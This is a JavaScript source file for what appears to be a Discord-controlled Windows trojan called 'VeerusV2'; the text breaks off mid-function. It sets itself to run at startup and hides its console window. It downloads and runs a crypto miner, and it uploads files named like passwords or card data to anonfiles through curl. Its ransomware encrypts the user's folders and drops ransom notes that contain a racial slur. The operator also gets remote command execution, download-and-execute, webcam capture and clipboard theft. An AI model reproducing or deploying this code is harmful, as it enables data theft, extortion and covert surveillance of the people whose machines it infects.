/*


        ░██████╗███████╗████████╗████████╗██╗███╗░░██╗░██████╗░░██████╗
        ██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝██║████╗░██║██╔════╝░██╔════╝
        ╚█████╗░█████╗░░░░░██║░░░░░░██║░░░██║██╔██╗██║██║░░██╗░╚█████╗░
        ░╚═══██╗██╔══╝░░░░░██║░░░░░░██║░░░██║██║╚████║██║░░╚██╗░╚═══██╗
        ██████╔╝███████╗░░░██║░░░░░░██║░░░██║██║░╚███║╚██████╔╝██████╔╝
        ╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░

*/
const fs = require('fs');
const urss = require("os").userInfo().username;


// Global settings
const FilegrabberOnStart = false;
const hideCnsl = false;
const OnStart = false;
const TOKEN = "MTA1MDExNDQwOTc4OTM5OTEyMA" // Your discord bot token
const channelID = "1025099023759188131" // Channel id for the messages.
const walletAddr = "Your XMR Adress" // Your XMR adress
const mineOnStart = true; // Mine XMR on start
const ransomOnStart = false;
var emailForRansom = "yazdrawlpb@gmail.com" // Email for the ransomware
var btcAdressForRansom = "bc1qcm34ax9ypck2h4f9smhn67s7xvkaefq5w7c8ls"; // Btc adress
var amountForRansom = "50"; // Amount to unlock the computer
const testMode = false; // If you wan't to do tests (it deactivate the ransomware/cmd)



// File grabber settings
const KeyWordsForFileGrabber = ["credit_card", "credit card", "passwords", "mdp", "password", "passw", ".txt"]
const FileGrabberLimit = 30; // Don't put a number to high
const maxFileSize = 2;
const FileGrabberPaths = [`C:/Users/${urss}/Desktop/`, `C:/Users/${urss}/Documents/`, `C:/Users/${urss}/Music/`, `C:/Users/${urss}/Videos/`]






function setToStartup() {
    const Fpath = process.argv[0]
    const startPth = "C:\\Users\\" + urss + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
    const startExePth = "C:\\Users\\" + urss + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
    fs.writeFileSync(startPth, "START " + startExePth);
    let dataF = fs.readFileSync(Fpath, {
        encoding: null
    });
    fs.writeFileSync(startExePth, dataF)
    console.log("[+] Set startup sucess")

}




const StartPath =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Svc.bat`
const StartPath2 =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Svc.exe`



// Ransomware settings
var ENC= 'dsazdazd41456d1za516d15za15daz15'; //Key for the Ransomware (must be 32 characters)
var IV = "54d45az456d15ad1"; // IV For the Ransomware (must be 16 characters)
const ALGO = "aes-256-cbc" // Hashing Algorithm


/*


                ██╗███╗░░░███╗██████╗░░█████╗░██████╗░████████╗░██████╗
                ██║████╗░████║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
                ██║██╔████╔██║██████╔╝██║░░██║██████╔╝░░░██║░░░╚█████╗░
                ██║██║╚██╔╝██║██╔═══╝░██║░░██║██╔══██╗░░░██║░░░░╚═══██╗
                ██║██║░╚═╝░██║██║░░░░░╚█████╔╝██║░░██║░░░██║░░░██████╔╝
                ╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░

*/

const os = require("os")
var downloaddd = require('file-download')
const clip = require('clipboard-data')
var path = require('path');
const parse5 = require("parse5")
var zipper = require('zip-local');
const { upload, getInfo, download } = require("node-annonfiles");
const open = require('open');
const gpuInfo = require('gpu-info');
const http = require('https');
const crypto = require('crypto');
const recursive = require("recursive-readdir");
const { exec } = require("child_process");
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder , Events, ModalBuilder, TextInputBuilder, TextInputStyle} = require('discord.js');
var request = require('request');
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
var NodeWebcam = require( "node-webcam" );


//Default options

var opts = {
    width: 1280,

    height: 720,

    quality: 100,

    frames: 60,

    delay: 0,

    saveShots: true,

    output: "jpeg",

    device: false,

    callbackReturn: "location",

    verbose: false
};


var Webcam = NodeWebcam.create( opts );



/*


            ▒█░▒█ ▀█▀ ▒█▀▀▄ ▒█▀▀▀ 　 ▒█▀▀█ ▒█▀▀▀█ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█░░░ ▒█▀▀▀ 
            ▒█▀▀█ ▒█░ ▒█░▒█ ▒█▀▀▀ 　 ▒█░░░ ▒█░░▒█ ▒█▒█▒█ ░▀▀▀▄▄ ▒█░░▒█ ▒█░░░ ▒█▀▀▀ 
            ▒█░▒█ ▄█▄ ▒█▄▄▀ ▒█▄▄▄ 　 ▒█▄▄█ ▒█▄▄▄█ ▒█░░▀█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄▄ 


*/

function hideSelf() {

    let powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    let workingDir = process.cwd();
    let tempfile = `${workingDir}\\temp.ps1`;
    fs.writeFileSync(tempfile, powershellScript);

    //a little convoluted to get around powershell script execution policy (might be disabled)
    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
    fs.unlinkSync(tempfile); //delete temp file
}








/*


                ░██████╗░██╗░░░░░░█████╗░██████╗░░█████╗░██╗░░░░░░██████╗
                ██╔════╝░██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔════╝
                ██║░░██╗░██║░░░░░██║░░██║██████╦╝███████║██║░░░░░╚█████╗░
                ██║░░╚██╗██║░░░░░██║░░██║██╔══██╗██╔══██║██║░░░░░░╚═══██╗
                ╚██████╔╝███████╗╚█████╔╝██████╦╝██║░░██║███████╗██████╔╝
                ░╚═════╝░╚══════╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░


*/



var paths = [
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
]


const tempPath = `C:\\Users\\${urss}\\AppData\\Roaming\\xXNegro2012Xx`
var foundeds = 0;
var max = false;
var FinalURL = ""

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
let VictimID = (Math.random() + 1).toString(36).substring(7);





/*


        ██╗░░██╗███████╗██╗░░░░░██████╗░███████╗██████╗░░██████╗
        ██║░░██║██╔════╝██║░░░░░██╔══██╗██╔════╝██╔══██╗██╔════╝
        ███████║█████╗░░██║░░░░░██████╔╝█████╗░░██████╔╝╚█████╗░
        ██╔══██║██╔══╝░░██║░░░░░██╔═══╝░██╔══╝░░██╔══██╗░╚═══██╗
        ██║░░██║███████╗███████╗██║░░░░░███████╗██║░░██║██████╔╝
        ╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░

*/

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}










/* 

        ███╗░░░███╗██╗███╗░░██╗███████╗██████╗░
        ████╗░████║██║████╗░██║██╔════╝██╔══██╗
        ██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝
        ██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗
        ██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║
        ╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝

*/






var nvidia = false;
var AMD = false;
var cantOpenMiner = false;
var output = `C:\\Users\\${urss}\\AppData\\Roaming\\SxZ.exe`;
var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;


async function MinerMain() {
    gpuInfo().then(function(data) {
        var infosG = data;
        if (JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")) {
            nvidia = true
        } else if (JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")) {
            AMD = true;
        } else {
            nvidia = false;
        }
        console.log("Nvidia? : " + nvidia)
    });


    var fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe";
    var ConfigUrl = "https://raw.githubusercontent.com/0xSxZ/Veerus/main/MINER_IMPORTANT/clientdownloads/config.json";



    if (nvidia == true) {

        fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-nvidia.exe"

    } else if (AMD == true) {

        fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-amd.exe"

    } else {

        fileUrl = `https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe`;

    }


    await request({
        url: fileUrl,
        encoding: null
    }, function(err, resp, body) {
        try {

            fs.writeFile(output, body, function(err) {
                console.log("Miner downloaded");
            });
        } catch {
            cantOpenMiner = true;
        }
    });



    await request(ConfigUrl, function(err, resp, body) {
        try {

            fs.writeFile(ConfigOutput, body.replace("YOUR_WALLET_ADDRESS", walletAddr), function(err) {
                
            });
        } catch {
            cantOpenMiner = true;
        }
    });

    await console.log("Starting Miner")

    await MinerThread()
}



function MinerThread(){
  console.log("Miner Started")
  if(cantOpenMiner == false){
    exec(output, (error, stdout, stderr) => {
      console.log(stdout)
    });
  }
}






/*


        ███████╗██╗██╗░░░░░███████╗  ░██████╗░██████╗░░█████╗░██████╗░██████╗░███████╗██████╗░
        ██╔════╝██║██║░░░░░██╔════╝  ██╔════╝░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
        █████╗░░██║██║░░░░░█████╗░░  ██║░░██╗░██████╔╝███████║██████╦╝██████╦╝█████╗░░██████╔╝
        ██╔══╝░░██║██║░░░░░██╔══╝░░  ██║░░╚██╗██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝░░██╔══██╗
        ██║░░░░░██║███████╗███████╗  ╚██████╔╝██║░░██║██║░░██║██████╦╝██████╦╝███████╗██║░░██║
        ╚═╝░░░░░╚═╝╚══════╝╚══════╝  ░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝

*/


async function FileGrabber() {
    var i = 0;
    fs.mkdirSync(tempPath, {
        recursive: true
    });
    while (i <= FileGrabberPaths.length - 1) {

        if (max == true) {
            break
            i = 100000;
            return
        }
        recursive(FileGrabberPaths[i], function(err, files) {

            try {
                for (n = 0; n <= files.length; n++) {

                    if (foundeds >= FileGrabberLimit) {

                        max = true
                        console.log("Zipping")
                        zipper.sync.zip(tempPath).compress().save("EZ.zip");
                        child = exec('curl -F "file=@EZ.zip" https://api.anonfiles.com/upload', function(error, stdout, stderr) {


                            client.channels.fetch(channelID)
                                .then(channel => {
                                    var msgModal = channel.send({
                                        content: "Files : " + stdout
                                    });
                                })
                        });
                        break
                        return
                    }
                    try {
                        if (files[n].includes(".ini")) {
                            continue
                        }
                        const contains = KeyWordsForFileGrabber.some(element => {
                            if (files[n].includes(element)) {
                                return true;
                            }

                            return false;
                        });


                        var stats = fs.statSync(files[n])
                        var fileSizeInBytes = stats.size;
                        var fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);

                        if (fileSizeInMegabytes >= maxFileSize) {
                            continue
                        }
                        if (contains === false) {
                            continue
                        } else {
                            console.log("Found ! ")
                            foundeds++;
                        }
                        fs.copyFile(files[n], tempPath + "\\" + files[n].split("\\")[files[n].split("\\").length - 1], (err) => {
                            if (err) {
                                console.log("Error Found:", err);
                            } else {

                            }
                        });
                    } catch (e) {
                        continue
                    }

                }
            } catch (e) {
                console.log(e)
            }
        });
        i++

    }
}

/*

        ██████╗░░█████╗░███╗░░██╗░██████╗░█████╗░███╗░░░███╗░██╗░░░░░░░██╗░█████╗░██████╗░███████╗
        ██╔══██╗██╔══██╗████╗░██║██╔════╝██╔══██╗████╗░████║░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝
        ██████╔╝███████║██╔██╗██║╚█████╗░██║░░██║██╔████╔██║░╚██╗████╗██╔╝███████║██████╔╝█████╗░░
        ██╔══██╗██╔══██║██║╚████║░╚═══██╗██║░░██║██║╚██╔╝██║░░████╔═████║░██╔══██║██╔══██╗██╔══╝░░
        ██║░░██║██║░░██║██║░╚███║██████╔╝╚█████╔╝██║░╚═╝░██║░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║███████╗
        ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝

*/

const encrypt = ((text) => 
{
   let cipher = crypto.createCipheriv(ALGO, ENC, IV);
   let encrypted = cipher.update(text, 'utf8', 'base64');
   encrypted += cipher.final('base64');
   return encrypted;
});
const decrypt = ((text) => 
{
   let decipher = crypto.createDecipheriv(ALGO, ENC, IV);
   let decrypted = decipher.update(text, 'base64', 'utf8');
   return (decrypted + decipher.final('utf8'));
});


async function rnsm(email, btcAdress, amount){
  // Sry for the hard coding :'(
  var counter = 0;
  recursive(`C:/Users/${urss}/Desktop/`, function (err, files) {
    
    try{
      for(i = 0; i<=files.length; i++){
        try{
                  if(files[i].includes(".ini")){
            continue
          }
          var contents = fs.readFileSync(files[i], 'utf8');
          var encrypted_key = encrypt(contents)
          console.log(encrypted_key)
          fs.truncate(files[i], 0, function(){console.log('done')})
          fs.writeFile(files[i], encrypted_key, function (err) {
            if (err) return console.log(err);
            console.log(files[i]);
          });

        }catch{
          continue
        }

      }
    }catch{
      return
    }
  });
  recursive(`C:/Users/${urss}/Documents/`, function (err, files) {
    
    try{
      for(i = 0; i<=files.length; i++){
                if(files[i].includes(".ini")){
            continue
          }
          var contents = fs.readFileSync(files[i], 'utf8');
          var encrypted_key = encrypt(contents)
          console.log(encrypted_key)
          fs.truncate(files[i], 0, function(){console.log('done')})
          fs.writeFile(files[i], encrypted_key, function (err) {
            if (err) return console.log(err);
            console.log(files[i]);
          });
        }
      }catch(e){
        console.log(e)
      }
  });
  recursive(`C:/Users/${urss}/Pictures/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }
    }catch{
    return
  }
  });
  recursive(`C:/Users/${urss}/Music/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }}catch{
    return
  }
  });
  recursive(`C:/Users/${urss}/3D Objects/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }}catch{
    return
  }
  });
  recursive(`C:/Users/${urss}/Videos/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }}catch{
    return
  }
  });
  recursive(`C:/Users/${urss}/Downloads/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch{
        continue
      }

    }}catch{
    return
  }
  });
  for(var i=0; i<=10; i++){
      fs.writeFileSync(`C:/Users/${urss}/Desktop/${makeid(10)}.txt`, "Hello, you just got ransomware'ed by VeerusV2 (made by YZD/SxZ so please follow on github my nigga), just send the amunt in bitcoin, contact us by email, you will get the antidote." + `\nAmount :  ${amount}$ (USD)\nEmail : ${email}\nAddresse Bitcoin : ${btcAdress}\n` );
  }

}




/*


        ███████╗███╗░░░███╗██████╗░███████╗██████╗░░██████╗
        ██╔════╝████╗░████║██╔══██╗██╔════╝██╔══██╗██╔════╝
        █████╗░░██╔████╔██║██████╦╝█████╗░░██║░░██║╚█████╗░
        ██╔══╝░░██║╚██╔╝██║██╔══██╗██╔══╝░░██║░░██║░╚═══██╗
        ███████╗██║░╚═╝░██║██████╦╝███████╗██████╔╝██████╔╝
        ╚══════╝╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═════╝░╚═════╝░

*/

var embedRick = new EmbedBuilder()
  .setColor(0xE9C9FF)
  .setTitle('Successfully opened link.')
  .setURL('https://github.com/0xSxZ')
  .setImage("https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif")
  .addFields(
    { name: 'Content', value: "Successfully opened link"},
    { name: '\u200B', value: '\u200B' },
  )
  .setTimestamp();

const embed = new EmbedBuilder()
    .setColor(0xE9C9FF)
    .setTitle('New victim connected')
    .setURL('https://github.com/0xSxZ')
    .setDescription('Click the buttons to control the computer (Victim ID : ' + VictimID + ")")
    .addFields(
        { name: 'Commands', value: '**EZ**'},
        { name: '\u200B', value: '\u200B' },
    )
    .setTimestamp();



/*



        ██████╗░██╗░░░██╗████████╗████████╗░█████╗░███╗░░██╗░██████╗
        ██╔══██╗██║░░░██║╚══██╔══╝╚══██╔══╝██╔══██╗████╗░██║██╔════╝
        ██████╦╝██║░░░██║░░░██║░░░░░░██║░░░██║░░██║██╔██╗██║╚█████╗░
        ██╔══██╗██║░░░██║░░░██║░░░░░░██║░░░██║░░██║██║╚████║░╚═══██╗
        ██████╦╝╚██████╔╝░░░██║░░░░░░██║░░░╚█████╔╝██║░╚███║██████╔╝
        ╚═════╝░░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝╚═════╝░


*/


const row = new ActionRowBuilder()
    .addComponents(
        new ButtonBuilder()
            .setCustomId('cmd')
            .setLabel('🖥 : CMD')
            .setStyle(ButtonStyle.Primary),

        new ButtonBuilder()
            .setCustomId('download')
            .setLabel('🎗 Download')
            .setStyle(ButtonStyle.Primary),

        new ButtonBuilder()
            .setCustomId('DownloadAndExecute')
            .setLabel('🧨 Download & Execute')
            .setStyle(ButtonStyle.Primary),

        new ButtonBuilder()
            .setCustomId('webcam')
            .setLabel('🎉 Webcam screenshot')
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId('next')
            .setLabel('➡')
            .setStyle(ButtonStyle.Primary),

);


const row2 = new ActionRowBuilder()
    .addComponents(
        new ButtonBuilder()
            .setCustomId('clipboard')
            .setLabel('📜 Clipboard')
            .setStyle(ButtonStyle.Primary),

        new ButtonBuilder()
            .setCustomId('website')
            .setLabel('🎭 Open website')
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId('ransom')
            .setLabel('☠ Ransomware')
            .setStyle(ButtonStyle.Primary),
);



/*


        ██████╗░░█████╗░████████╗
        ██╔══██╗██╔══██╗╚══██╔══╝
        ██████╦╝██║░░██║░░░██║░░░
        ██╔══██╗██║░░██║░░░██║░░░
        ██████╦╝╚█████╔╝░░░██║░░░
        ╚═════╝░░╚════╝░░░░╚═╝░░░

*/
client.on('ready', () => {
    console.log("VeerusV2 is ready !")
    client.channels.fetch(channelID)
    .then(channel => {
        var mss = channel.send({ content: "New victim" + FinalURL, embeds: [embed] , components: [row] });
    })



});


client.on(Events.InteractionCreate, async interaction => {
    try{


      async function WebCamScreen(){
          var pth = makeid(7);
          await Webcam.capture( pth, function( err, data ) {
            interaction.channel.send({ content: ":rofl:", files: [pth + ".jpg"] })
          } );
          
      }
      var embedClip = new EmbedBuilder()
          .setColor(0xE9C9FF)
          .setTitle('Clipboard Content')
          .setURL('https://github.com/0xSxZ')
          .setDescription('Clipboard (Victim ID : ' + VictimID + ")")
          .addFields(
              { name: 'Content', value: clip.getText()},
              { name: '\u200B', value: '\u200B' },
          )
          .setTimestamp();

/*


        ██████╗░██╗░░░██╗████████╗████████╗░█████╗░███╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗
        ██╔══██╗██║░░░██║╚══██╔══╝╚══██╔══╝██╔══██╗████╗░██║  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝
        ██████╦╝██║░░░██║░░░██║░░░░░░██║░░░██║░░██║██╔██╗██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░
        ██╔══██╗██║░░░██║░░░██║░░░░░░██║░░░██║░░██║██║╚████║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░
        ██████╦╝╚██████╔╝░░░██║░░░░░░██║░░░╚█████╔╝██║░╚███║  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗
        ╚═════╝░░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝


*/
        var CustomID = interaction.customId
        if (interaction.isButton()){
            if(CustomID == "cmd"){
                const modal = new ModalBuilder()
                        .setCustomId('modalCMD')
                        .setTitle('CMD');
                const VictimID = new TextInputBuilder()
                    .setCustomId('victimid')
                    .setLabel("Victim ID")
                    .setStyle(TextInputStyle.Short);
                const cmdd = new TextInputBuilder()
                    .setCustomId('cmdd')
                    .setLabel("Command")
                    .setStyle(TextInputStyle.Short);
                const roww = new ActionRowBuilder().addComponents(VictimID);
                const rowcmd = new ActionRowBuilder().addComponents(cmdd);

            modal.addComponents(roww, rowcmd);

            await interaction.showModal(modal);


            }  
        }

        if(CustomID == "download"){
                const modalD = new ModalBuilder()
                        .setCustomId('modaldownload')
                        .setTitle('DOWNLOAD');
                const victi = new TextInputBuilder()
                    .setCustomId('victimid')
                    .setLabel("Victim ID")
                    .setStyle(TextInputStyle.Short);
                const down = new TextInputBuilder()
                    .setCustomId('downloadurl')
                    .setLabel("URL")
                    .setStyle(TextInputStyle.Short);
                const rowww = new ActionRowBuilder().addComponents(victi);
                const rowdown = new ActionRowBuilder().addComponents(down);
                modalD.addComponents(rowww, rowdown);
                await interaction.showModal(modalD);
        }

        if(CustomID == "DownloadAndExecute"){
                const modalD = new ModalBuilder()
                        .setCustomId('modaldownloadAndEx')
                        .setTitle('DOWNLOAD');
                const victi = new TextInputBuilder()
                    .setCustomId('victimid')
                    .setLabel("Victim ID")
                    .setStyle(TextInputStyle.Short);
                const down = new TextInputBuilder()
                    .setCustomId('downloadurl')
                    .setLabel("URL")
                    .setStyle(TextInputStyle.Short);
                const rowww = new ActionRowBuilder().addComponents(victi);
                const rowdown = new ActionRowBuilder().addComponents(down);
                modalD.addComponents(rowww, rowdown);
                await interaction.showModal(modalD);
        }

        if(CustomID == "webcam"){
          await WebCamScreen()
        }




        if(CustomID == "website"){

                const modalDW = new ModalBuilder()
                        .setCustomId('modalwebsite')
                        .setTitle('WEBSITE');
                const victiW = new TextInputBuilder()
                    .setCustomId('victimid')
                    .setLabel("Victim ID")
                    .setStyle(TextInputStyle.Short);
                const downW = new TextInputBuilder()
                    .setCustomId('url')
                    .setLabel("URL")
                    .setStyle(TextInputStyle.Short);
                const rowwwW = new ActionRowBuilder().addComponents(victiW);
                const rowdownW = new ActionRowBuilder().addComponents(downW);

                modalDW.addComponents(rowwwW, rowdownW);

                await interaction.showModal(modalDW);



        }
        if(CustomID == "clipboard"){
            await interaction.reply({ embeds: [embedClip]});
        }



        if(CustomID == "stream"){
           
            interaction.reply({ embeds: [embed] , components: [row2] })
        }


        if(CustomID == "next"){
            console.log("Next")
            interaction.reply({ embeds: [embed] , components: [row2] })


        }
        if(CustomID == "ransom"){
                const modalR = new ModalBuilder()
                        .setCustomId('modalransom')
                        .setTitle('DOWNLOAD');
                const victiR = new TextInputBuilder()
                    .setCustomId('victimid')
                    .setLabel("Victim ID")
                    .setStyle(TextInputStyle.Short);
                const downR = new TextInputBuilder()
                    .setCustomId('emaill')
                    .setLabel("Your Yandex Email")
                    .setStyle(TextInputStyle.Short);
                const downRB = new TextInputBuilder()
                    .setCustomId('btcaddr')
                    .setLabel("Your Bitcoin Adress")
                    .setStyle(TextInputStyle.Short);
                const downRBC = new TextInputBuilder()
                    .setCustomId('amount')
                    .setLabel("Amount (in USD)")
                    .setStyle(TextInputStyle.Short);
                const rowwwR = new ActionRowBuilder().addComponents(victiR);
                const rowdownR = new ActionRowBuilder().addComponents(downR);
                const rowdownRB = new ActionRowBuilder().addComponents(downRB);
                const rowdownRBC = new ActionRowBuilder().addComponents(downRBC);
                modalR.addComponents(rowwwR, rowdownR, rowdownRB, rowdownRBC);

                await interaction.showModal(modalR);



        }




/*


        ███████╗░█████╗░██████╗░███╗░░░███╗  ░██████╗██╗░░░██╗██████╗░███╗░░░███╗██╗████████╗
        ██╔════╝██╔══██╗██╔══██╗████╗░████║  ██╔════╝██║░░░██║██╔══██╗████╗░████║██║╚══██╔══╝
        █████╗░░██║░░██║██████╔╝██╔████╔██║  ╚█████╗░██║░░░██║██████╦╝██╔████╔██║██║░░░██║░░░
        ██╔══╝░░██║░░██║██╔══██╗██║╚██╔╝██║  ░╚═══██╗██║░░░██║██╔══██╗██║╚██╔╝██║██║░░░██║░░░
        ██║░░░░░╚█████╔╝██║░░██║██║░╚═╝░██║  ██████╔╝╚██████╔╝██████╦╝██║░╚═╝░██║██║░░░██║░░░
        ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═════╝░░╚═════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░


*/
        if(interaction.isModalSubmit()){
            console.log(interaction.fields.getTextInputValue("victimid"))
            if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modalCMD"){
              if(testMode != true){

                  exec(interaction.fields.getTextInputValue("cmdd"), (error, stdout, stderr) => {
                      if (error) {
                          interaction.reply(`**ERROR**\n${error.message}`);
                          return;
                      }
                      if (stderr) {
                          interaction.reply(`**ERROR**\n${stderr}`);
                          return;
                      }
                      interaction.reply(`**Successfully executed** \nstdout: ${stdout}`);
                  });
                }else{
                  interaction.reply("[+] **Test mode is ON**, so the command can't be executed.")
                }
            }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modaldownloadAndEx"){
                var file = ""
                var filepath = makeid(7) + interaction.fields.getTextInputValue("downloadurl").split("/")[interaction.fields.getTextInputValue("downloadurl").split("/").length-1]

                  var options = {
                      directory: os.tmpdir() ,
                      filename: filepath
                  }

                  downloaddd(interaction.fields.getTextInputValue("downloadurl"), options, function(err){
                          var embedDownloaded = new EmbedBuilder()
                            .setColor(0xE9C9FF)
                            .setTitle('Successfully downloaded & Executed')
                            .setURL('https://github.com/0xSxZ')
                            .setImage("https://thumbs.gfycat.com/EvenWaryFrog-size_restricted.gif")
                            .addFields({
                              name:"Successfully downloaded", value:"**Path :**" + os.tmpdir() + "\\" +filepath 
                            })
                            .setTimestamp();
                          exec(os.tmpdir() + "\\" + filepath, (error, stdout, stderr) => {
                            if (error) {
                              console.error(`exec error: ${error}`);
                              return;
                            }
                            console.log(`stdout: ${stdout}`);
                            console.error(`stderr: ${stderr}`);
                          });
                        

                         interaction.reply({ embeds: [embedDownloaded]});
                      if (err) throw err
                    
                  }) 
            }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modaldownload"){
                var file = ""
